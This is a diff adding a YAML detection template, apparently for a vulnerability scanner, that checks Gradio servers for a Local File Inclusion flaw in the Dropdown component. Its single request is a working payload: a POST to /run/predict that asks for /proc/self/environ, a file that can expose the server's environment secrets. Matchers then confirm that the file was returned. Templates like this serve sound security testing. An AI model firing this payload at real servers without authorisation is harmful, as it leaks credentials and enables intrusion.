@@ -1,0 +1,35 @@
+id: gradio-lfi
+brief:
+    title: Gradio - Local File Inclusion
+    by: ritikchaddha
+    level: critical
+    about: Gradio's Dropdown component is vulnerable to Local File Inclusion (LFI) when the value is a dictionary controlled by an attacker. In the postprocess of components, if the value type is a dict, it f...
+    label:
+        - lfi
+        - gradio
+        - file-inclusion
+    score: CVSS:7.5
+moves:
+    - verb: POST
+      to:
+        - '{{BaseURL}}/run/predict'
+      head:
+        Content-Type: application/json
+      body: '{"data":["{\"path\":\"/proc/self/environ\"}"],"event_data":null,"fn_index":0,"trigger_id":2,"session_hash":"ig8gs2fazn"}'
+      signs:
+        - "on": word
+          has:
+            - 'url":'
+            - path":"
+            - data":[{
+            - FileData
+          in: body
+          need: all
+        - "on": word
+          has:
+            - application/json
+          in: content_type
+          need: all
+        - "on": status
+          status:
+            - 200
